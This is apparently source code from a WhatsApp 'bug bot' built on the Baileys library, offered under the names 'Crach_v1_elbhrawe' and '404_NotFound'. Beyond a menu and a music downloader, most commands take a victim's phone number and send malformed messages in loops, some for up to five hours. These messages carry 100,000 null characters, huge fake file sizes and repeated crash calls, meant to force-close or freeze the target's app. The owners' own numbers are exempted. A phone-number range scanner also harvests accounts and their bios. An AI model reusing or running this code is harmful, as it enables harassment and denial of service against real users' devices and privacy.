          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await XeonBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}
//==============================================================\\
if (m.message) {

    // Log the message details
    console.log(
        chalk.black(chalk.bgWhite('[ MESSAGE ]')),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' +
        chalk.magenta('=> FROM'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' +
        chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', from)
    );
}

switch(command) {
/*case 'xjxjxjxoke': {
	let audiobuffy = fs.readFileSync(`./oke.mp3`)
	XeonBotInc.sendMessage('919863235489@s.whatsapp.net', { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true })     
	}
	k*/
     
 case 'menu': 
try {
var abc = generateWAMessageFromContent(from, proto.Message.fromObject({
  "interactiveMessage": {
    "header": {
      "imageMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQP7wd63yXXKBGyTnXbWfOd8pz15oedIJQPdQriIgxvs0kccuxcbO3GP46PBPAAgFeh_RSc2kQBRZ9Pk-iiGkPgLiajqRd7SU1w_KWpCDA?ccb=9-4&oh=01_Q5Aa3QEzDJBEkmN2UHZ7a0mwM4qgBS0JcR73wl3ZdoyD7WfqXA&oe=697AB630&_nc_sid=e6ed6c&mms3=true",
        "mimetype": "image/jpeg",
        "caption": "\n`Hi, HX BOT`\n\nI'am 𝑪𝑶𝑴𝑨𝑵𝑫𝑬𝑹 I am a WhatsApp bot created by @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏 \n\n─|> 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗕𝗼𝘁\n▢ Creator : 𝑪𝑶𝑴𝑨𝑵𝑫𝑬𝑹\n▢ Bot Name : 404_NotFound -𝐕11 Vip\n▢ Version : 11.0.0\n▢ Prefix : \".\"\n\n─|> 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂\n▢.crashmsg 『 Force Close 1 Msg 』\n▢.xcrash 『 Invisible Force Close 』\n▢.xdelay_hard 『 Delay Invisible 』\n\n─|> 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂\n▢.addmurbug\n▢.delmurbug\n\n─|> 𝗔𝗱𝗺𝗶𝗻 𝗠𝗲𝗻𝘂\n▢.public\n▢.self\n▢.>\n▢.exec\n",
        "fileSha256": "Kfo8qv06uruUJRQ4roG6FVX9oTumfsXDfdzvSznsNms=",
        "fileLength": "2720488",
        "height": 1920,
        "width": 1080,
        "mediaKey": "7nwg8QsnFpFBGqOXkLvL3ZSRtussJ+JFAZX7DNoy59U=",
        "fileEncSha256": "UrlHHy9Re6eoarDwcfUO83QllZj9ZWgH1GvRNQvBSjU=",
        "directPath": "/o1/v/t24/f2/m233/AQOHeyLXggelEFqlSalGLT91RxwSII-4D0e_0-n2rJT_Ca4UkQlkSZAdDPF05Ayj88wXP2fQU0YfohFlLhhShdgbhUiuOOO1hyHUSmtf-A?ccb=9-4&oh=01_Q5Aa3QHpY82_EtDBhjxTpvkVKHDAOguVHAVjYhhUCBvKlE-W1Q&oe=697AA903&_nc_sid=e6ed6c",
        "mediaKeyTimestamp": "1767059382",
        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgANgMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQEGAQEBAQEAAAAAAAAAAAAAAAAAAQMC/9oADAMBAAIQAxAAAAD5kAAAD3y1a56aZpCG3GkRc/evx9M12U6skvb4nQ4iwHWCcC6KoJbqSwEAAAA//8QAJhAAAgIBAwMDBQAAAAAAAAAAAQIAAyEEERIQMUEFExQiJDBAUf/aAAgBAQABPwD84G5hBEVd/EKfyHHWkb2LL6wDyPaBUxhsyyorWMGE79ANyBNJpk5gbz1Efcqg7ATmEKkDImhX5eksa3uDgzU0ovIg9ab3rYTUNXqVUseLjzBTn6rVAjalU03t1YQRnZyST1BHmHKgRseTFs2Qr+j/AP/EABoRAAICAwAAAAAAAAAAAAAAAAABEDERIDD/2gAIAQIBAT8A1yKGWW+X/8QAIBEAAgIABgMAAAAAAAAAAAAAAQIAERASICExUQMyYf/aAAgBAwEBPwDQosgQplYixtHULh42UX2eD1BaZgRPRKbfNwOsAaha4WJr5q//2Q==",
        "annotations": [
          {
            "polygonVertices": [
              {
                "x": 60.71664810180664,
                "y": -36.39784622192383
              },
              {
                "x": -16.710189819335938,
                "y": 49.263675689697266
              },
              {
                "x": -56.585853576660156,
                "y": 37.85963439941406
              },
              {
                "x": 20.840980529785156,
                "y": -47.80188751220703
              }
            ],
            "newsletter": {
              "newsletterJid": "120363425675094922@newsletter",
              "newsletterName": "Crach_v1_elbhrawe ",
              "contentType": "UPDATE",
              "accessibilityText": ""
            }
          }
        ]
      },
      "hasMediaAttachment": true
    },
    "body": {
      "text": "\n` Hello, Crach_v1_elbhrawe`\n\ni'am Crach_v1_elbhrawe I am a WhatsApp bot created by @B_o_d_a1FR \n\n─|> 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗕𝗼𝘁\n▢ Creator : Crach_v1_elbhrawe\n▢ Bot Name : Crach_v1_elbhrawe -𝐕11 Vip\n▢ Version : 11.0.0\n▢ Prefix : \".\""
    },
    "footer": {
      "text": "Crach_v1_elbhrawe"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "single_select",
          "buttonParamsJson": "{\"has_multiple_buttons\":true}"
        },
        {
          "name": "call_permission_request",
          "buttonParamsJson": "{\"has_multiple_buttons\":true}"
        },
        {

          "name": "quick_reply",

          "buttonParamsJson": "{\"display_text\":\"allmenu\",\"id\":\".abc\"}"

        },  
        {
     
          "name": "single_select",
          "buttonParamsJson": "{\"title\":\"Info Update Script\",\"sections\":[{\"title\":\"INFORMATION\",\"highlight_label\":\"label\",\"rows\":[{\"title\":\"CHANNEL\",\"description\":\"https:\\/\\/whatsapp.com\\/channel\\/0029VbC3P537T8baaNuZWS0Y\\n\\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.\",\"id\":\"row_1\"},{\"title\":\"CHANEL TELEGRAM\",\"description\":\"t.me/Notfound_Comander\\/\",\"id\":\"row_2\"},{\"title\":\"CONTACT DEVELOPER\",\"description\":\"*TELEGRAM*\\nt.me\\/comander404_Notfound\\n\\n*WHATSAPP*\\n+201507151697\",\"id\":\"row_3\"}]}],\"has_multiple_buttons\":true}"
        },
        {
          "name": "cta_copy",
          "buttonParamsJson": "{\"display_text\":\"Crach_v1_elbhrawe -𝐕11 Vip\",\"id\":\"123456789\",\"copy_code\":\"https:\\/\\/t.me\\/B_o_d_a1FR\"}"
        },
        {
          "name": "cta_call",
          "buttonParamsJson": "{\"display_text\":\"Call Developer\",\"phone_number\":\"+201005605035\"}"
        },
        {
          "name": "quick_reply",
          "buttonParamsJson": "{\"display_text\":\"contact Developer\",\"id\":\".owner\"}"
        },
        
      ],
      "messageParamsJson": "{\"limited_time_offer\":{\"text\":\"Crach_v1_elbhrawe -𝐕11 Vip\",\"url\":\"t.me/B_o_d_a1FR\",\"copy_code\":\"Crach_v1_elbhrawe -𝐕11 Vip\",\"expiration_time\":1765291537095309},\"bottom_sheet\":{\"in_thread_buttons_limit\":2,\"divider_indices\":[1,2,3,4,5,999],\"list_title\":\"Crach_v1_elbhrawe -𝐕11 Vip\",\"button_title\":\"Crach_v1_elbhrawe -𝐕11 Vip\"},\"tap_target_configuration\":{\"title\":\"▸ X ◂\",\"description\":\"bomboclard\",\"canonical_url\":\"https://t.me/B_o_d_a1FR\",\"domain\":\"shop.example.com\",\"button_index\":0}}"
    },
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA"
    }
  }
}),{ userJid: from })
XeonBotInc.relayMessage(from, abc.message, {messageId: abc.key.id })
} catch (e) {
console.log(e)
}
break
  case 'abc': {

  const axios = require('axios')
  const run = runtime(process.uptime())

  const {
    generateWAMessageContent,
    generateWAMessageFromContent
  } = require('@adiwajshing/baileys')

  // تأكد من وجود الكاش
  global.menuImageCache = global.menuImageCache || {}

  try {
    const categories = [
      {
        title: "𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨",
        desc: `
▬▬▬▬▬▬▬▬▬▬▬
✦ ❄️ HELLO : ${m.pushName}
✦ ❄️ RUNTIME : ${run}
✦ ❄️ Crach_v1_elbhrawe -𝐕IP
▬▬▬▬▬▬▬▬▬▬▬
✦ ❄️ public
✦ ❄️ self
✦ ❄️ addprem
▬▬▬▬▬▬▬▬▬▬▬
        `,
        button: {
          text: "𝗖𝗢𝗠𝗠𝗨𝗡𝗜𝗧𝗬",
          url: "https://whatsapp.com/channel/0029Vb7JymRAO7RC0SsvFL1N"
        },
        image: "https://files.catbox.moe/8c1rds.jpg"
      },
      {
        title: "𝗕𝗨𝗚 𝗠𝗘𝗡𝗨",
        desc: `
▬▬▬▬▬▬▬▬▬▬▬
✦ ❄️ HELLO : ${m.pushName}
✦ ❄️ RUNTIME : ${run}
✦ ❄️ Crach_v1_elbhrawe -𝐕IP
▬▬▬▬▬▬▬▬▬▬▬
✦ ❄️  xcrash
✦ ❄️  xdelay_hard
✦ ❄️  crashmsg
✦ ❄️  xnxx
✦ ❄️  crashmsgnew
✦ ❄️  crashuihard
✦ ❄️  crashchatt
✦ ❄️  iosinvisible
✦ ❄️  groupmix
▬▬▬▬▬▬▬▬▬▬▬
        `,
        button: {
          text: "𝗖𝗢𝗠𝗠𝗨𝗡𝗜𝗧𝗬",
          url: "https://whatsapp.com/channel/0029Vb7JymRAO7RC0SsvFL1N"
        },
        image: " https://files.catbox.moe/8c1rds.jpg"
      },
      {
        title: "𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨",
        desc: `
▬▬▬▬▬▬▬▬▬▬▬
✦ ❄️ HELLO : ${m.pushName}
✦ ❄️ RUNTIME : ${run}
✦ ❄️ Crach_v1_elbhrawe -𝐕IP
▬▬▬▬▬▬▬▬▬▬▬
✦ ❄️  cekdevice
✦ ❄️  ping
✦ ❄️  listgs
✦ ❄️  groupId
✦ ❄️  idch
✦ ❄️  play
✦ ❄️  kickall
✦ ❄️  forceblock
✦ ❄️  xpairspam
✦ ❄️  autoswview on / off
▬▬▬▬▬▬▬▬▬▬▬
        `,
        button: {
          text: "𝗖𝗢𝗠𝗠𝗨𝗡𝗜𝗧𝗬",
          url: "https://whatsapp.com/channel/0029Vb7JymRAO7RC0SsvFL1N"
        },
        image: "https://files.catbox.moe/8c1rds.jpg"
      }
    ]

    const carouselCards = await Promise.all(
      categories.map(async (item, index) => {
        let imageMsg = global.menuImageCache[item.image]

        if (!imageMsg) {
          const res = await axios.get(item.image, { responseType: 'arraybuffer' })

          imageMsg = (
            await generateWAMessageContent(
              { image: Buffer.from(res.data) },
              { upload: XeonBotInc.waUploadToServer }
            )
          ).imageMessage

          global.menuImageCache[item.image] = imageMsg
        }

        return {
          header: {
            title: item.title,
            hasMediaAttachment: true,
            imageMessage: imageMsg
          },
          body: { text: item.desc },
          footer: { text: `📖 Page ${index + 1} of ${categories.length}` },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: item.button.text,
                  url: item.button.url,
                  merchant_url: item.button.url
                })
              }
            ]
          }
        }
      })
    )

    const carouselMessage = generateWAMessageFromContent(
      from,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: { text: "Crach_v1_elbhrawe" },
              footer: { text: "Crach_v1_elbhrawe -𝐕IP" },
              carouselMessage: {
                cards: carouselCards
              }
            }
          }
        }
      },
      { quoted: m }
    )

    await XeonBotInc.relayMessage(from, carouselMessage.message, {
      messageId: carouselMessage.key.id
    })

  } catch (err) {
    console.error("❌ Menu command error:", err)
    replygcxeon("⚠️ Failed to load menu. Please try again later.")
  }
}
break      
        
        
 case 'play': {
             if (!isBot && !isCreator) return
  try {
    const yts = require('yt-search');

    const tempDir = path.join(__dirname, "temp");
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    if (!args.length) return replygcxeon(`🎵 Informe o nome da música!\nExemplo: ${prefix || ''}play Not Like Us`);

    const query = args.join(" ").trim();
    if (query.length > 200) return replygcxeon(`📝 Nome da música muito grande! Máximo de 200 caracteres.`);

    // Informar usuário
    await replygcxeon("🎧 Procurando a música, aguarde... ⏳");

    // Buscar no YouTube
    const search = await yts(`${query} official`);
    const video = (search && search.videos && search.videos[0]) ? search.videos[0] : null;
    if (!video) return replygcxeon("😕 Não encontrei essa música. Tente outro nome.");

    // Usar API de download
    const apiUrl = `https://api.privatezia.biz.id/api/downloader/ytmp3?url=${encodeURIComponent(video.url)}`;
    const apiRes = await axios.get(apiUrl, { timeout: 20000 }).catch(e => {
      throw new Error("Não foi possível conectar à API de download.");
    });
    const apiData = apiRes.data;
    if (!apiData || !apiData.status || !apiData.result || !apiData.result.downloadUrl) {
      throw new Error("A API não conseguiu obter as informações da música.");
    }

    // Preparar caminhos do arquivo
    const timestamp = Date.now();
    const safeTitle = (apiData.result.title || video.title || 'audio')
      .replace(/[\\\/:*?"<>|]/g, '')
      .slice(0, 120);
    const fileName = `audio_${timestamp}.mp3`;
    const filePath = path.join(tempDir, fileName);

    // Baixar MP3 em stream
    const audioResponse = await axios({
      method: "get",
      url: apiData.result.downloadUrl,
      responseType: "stream",
      timeout: 600000
    }).catch(e => {
      throw new Error("Falha ao baixar o áudio.");
    });

    const writer = fs.createWriteStream(filePath);
    audioResponse.data.pipe(writer);
    await new Promise((resolve, reject) => {
      writer.on('finish', resolve);
      writer.on('error', reject);
      audioResponse.data.on('error', err => reject(err));
    });

    // Validar arquivo
    if (!fs.existsSync(filePath) || fs.statSync(filePath).size === 0) {
      try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e){}
      throw new Error("O download falhou ou o arquivo veio vazio.");
    }

    // Enviar aviso e depois o áudio
    await XeonBotInc.sendMessage(from, {
      text: `🎶 Tocando agora: *${safeTitle}*\n🎥 Origem: ${video.url}`
    }, { quoted: m });

    const audioBuffer = fs.readFileSync(filePath);
    await XeonBotInc.sendMessage(from, {
      audio: audioBuffer,
      mimetype: 'audio/mpeg',
      fileName: `${safeTitle}.mp3`
    }, { quoted: m });

    // Limpeza
    try { fs.unlinkSync(filePath); } catch (e) {}

  } catch (error) {
    console.error('Play command error:', error);
    return replygcxeon(`💥 Erro: ${error.message || 'Ocorreu um erro ao processar sua solicitação.'}`);
  }
}
break;    

    case 'com': {

    if (!text) return replygcxeon(`*example:*\n ${prefix + command} +20XXX`);

    let target = `${q.replace(/[^0-9]/g, "")}@s.whatsapp.net`;

    await albumbuggers2(target, true);

    await albumbuggers1(target, true);

    replygcxeon(`*success send bug ${command} to ${target}*`);

  console.log(chalk.green(`succes send bugs to ${target}`))

}

break    
      
  case 'unsspx': {
              if (!isBot && !isCreator) return
       if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
   await chatFrezz0e(Xreturn)
    await XeonBotInc.relayMessage(m.chat, {
        botForwardedMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        paramsJson: "\u0000".repeat(100000),
                        version: 3
                    }
                }
            }
        }
    }, {});
      }
    break;      
    
     case 'crashmsgnew': {
        if (!isBot && !isCreator) return


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201005605035") {
    return;
    }
    if (victim == "201005605035") {
    return;
    }
    if (victim == "201005605035") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <2; i++) {
      await FcContacNew(Xreturn);
}
}
break    
     
      case 'crashmsg': {
        if (!isBot && !isCreator) return


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201507151697") {
    return;
    }
    if (victim == "201032935369") {
    return;
    }
    if (victim == "201206738488") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <2; i++) {
      await cra0shmsg(Xreturn);
}
}
break  
        
        

        
case 'crashInfinity':
case 'hxcrash':
case 'xcrash':
case 'xnxx': {
        if (!isBot && !isCreator) return


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201005605035") {
    return;
    }
    if (victim == "201005605035") {
    return;
    }
    if (victim == "201005605035") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <50; i++) {
      await callCrash(Xreturn);
      await callCrash(Xreturn);
      await (1000)
      await callCrash(Xreturn);
      await callCrash(Xreturn);
      await (1000)
await callCrash(Xreturn);
      await callCrash(Xreturn);
      await callCrash(Xreturn);
      await (1000)
      await callCrash(Xreturn);
      await (1000)
      await callCrash(Xreturn);
await callCrash(Xreturn);
      await (1000)
await callCrash(Xreturn);
}
}
break
case "test11" :
await XeonBotInc.relayMessage(m.chat, {
    requestPaymentMessage: {
      currencyCodeIso4217: "USD",
      amount1000: 9999999,
      noteMessage: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.15575-24/25379495_1233047614391746_7167397995027803975_n.enc",
          fileSha256: "AsFkxvyLnK222nsY5s6MhoF4NSKwRg7ViAI5nTcPKUs=",
          fileEncSha256: "72VMs7G12NGe7VQ2xJ25sNemjAPsdhITdgyvHgrQmdM=",
          mediaKey: "1yHvOqdtF1xEwpPnudsJInh09EBqrJWEZcDma7K6ORo=",
          mimetype: "image/webp",
          height: 64,
          width: 64,
          fileLength: 253140,
          mediaKeyTimestamp: 1724474267,
          firstFrameLength: 15246,
          firstFrameSidecar: "N4MITqGgH587+A==",
          isAnimated: true,
          stickerSentTs: 1724474267588,
          contextInfo: {
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: m.chat,
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: 9999999999999,
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "⭑ꊰꋬꋊ꒐꓄ꌦ  ▻ ",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                mediaKeyTimestamp: 1724474503,
                contactVcard: true
              }
            },
            externalAdReply: {
              title: "x",
              mediaType: 2,
              sourceUrl: ""
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "1@newsletter",
              serverMessageId: 1,
              newsletterName: "#"
            }
          }
        }
      },
      expiryTimestamp: 0,
      amount: {
        value: 999999999,
        offset: 0,
        currencyCode: "USD"
      },
      background: {
        id: "100",
        fileLength: 928283,
        width: 1000,
        height: 1000,
        mimetype: "image/jpeg",
        placeholderArgb: 4278190080,
        textArgb: 4294967295,
        subtextArgb: 4278190080
      }
    }
  },
  {}
)
case 'uistresser': case 'fcspambeta': {
        if (!isBot && !isCreator) return

if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201507151697") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
const FIVE_HOURS = 5 * 60 * 60 * 1000; // 5 hours in milliseconds
    const startTime = Date.now();

    while (Date.now() - startTime < FIVE_HOURS) {
    try {
    	await xeonAndroSpam(Xreturn);
    	await forcer(Xreturn);
        await sleep(500);
    } catch (err) {
        if (
            err?.output?.statusCode === 428 ||
            err?.output?.statusCode === 408 ||
            err.message.includes('Connection Closed') ||
            err.message.includes('Timed Out') ||
            err.code === 'ECONNABORTED'
        ) {
            console.log(`⚠️Bug ${command} ended for ${Xreturn} ✅`);
            break;
        }
    }
   //
}
}
break



	
	case 'iosinvisible': {
        if (!isBot && !isCreator) return
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201507151697") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <300; i++) {
await xiosinv(Xreturn)
      await (1000)
await xiosinv(Xreturn)
}
}
break

case 'crashuihard': {
    if (!isBot && !isCreator) return
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201507151697") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <5; i++) {
      await Crash00UI(Xreturn)
await BlankSpamKevv(Xreturn)
await crash0ui(Xreturn)
await NotifXButton(Xreturn);
    await callSystem(Xreturn);
    await frezeeClick(Xreturn);
    await exTension(Xreturn);
    await NativeflowUI(Xreturn);
    await Notifspam(Xreturn);
    await StcCrash(Xreturn);
    await UIMention(Xreturn);
    await buttonXBlank(Xreturn);
}
}
break
	case 'device': case 'checkdevice': case 'cekdevice': {
if (!isBot && !isCreator) return
  if (!isBot) return;

  const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  const quotedMessageId = m.message?.extendedTextMessage?.contextInfo?.stanzaId;

  if (!quotedMsg || !quotedMessageId) {
    await XeonBotInc.sendMessage(from, { text: 'Quote The Target Message' }, { quoted: m });
    break;
  }

  const devicec = 
    quotedMessageId.length > 21
      ? 'Device: Android'
      : quotedMessageId.startsWith('3A')
        ? 'Device: iOS'
        : 'Device: WhatsApp Web or BotAPI';

  await XeonBotInc.sendMessage(from, { text: devicec }, { quoted: m });
  }
  break;
	case 'iosvisible':  {
if (!isBot && !isCreator) return

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201507151697") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 999; i++) {
await iosLx(Xreturn);
await sleep(1000);
}
		}
		break
	
  case "tourl": {
      if (!isBot && !isCreator) return
  if (!/image|video/.test(mime)) return replygcxeon('Kirim atau reply gambar/video yang ingin diubah ke URL!');

  const fetch = (await import('node-fetch')).default;
  const FormData = (await import('form-data')).default;
  const { ImageUploadService } = require('node-upload-images');
  const { fromBuffer } = require('file-type');
  const mediaData = m.quoted ? await m.quoted.download() : await m.download();

  // Fungsi upload ke pixhost.to (untuk gambar)
  async function uploadPixhost(buffer) {
    const service = new ImageUploadService('pixhost.to');
    const { directLink } = await service.uploadFromBinary(buffer, 'upload.png');
    return directLink;
  }

  // Fungsi upload ke catbox.moe (untuk gambar & video)
  async function uploadCatbox(buffer) {
    let { ext } = await fromBuffer(buffer);
    let bodyForm = new FormData();
    bodyForm.append("fileToUpload", buffer, "file." + ext);
    bodyForm.append("reqtype", "fileupload");
    let res = await fetch("https://catbox.moe/user/api.php", {
      method: "POST",
      body: bodyForm
    });
    return await res.text();
  }

  let url;
  if (/image/.test(mime)) {
    try {
      url = await uploadPixhost(mediaData);
    } catch {
      url = await uploadCatbox(mediaData);   }
  } else {
    url = await uploadCatbox(mediaData);
  }

  await XeonBotInc.sendMessage(m.chat, { text: `*Url :* ${url}\n*Expired :* Permanen` }, { quoted: m });
}
break
        
        
	case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
if (!isBot && !isCreator) return
           	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcxeon(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await XeonBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await XeonBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
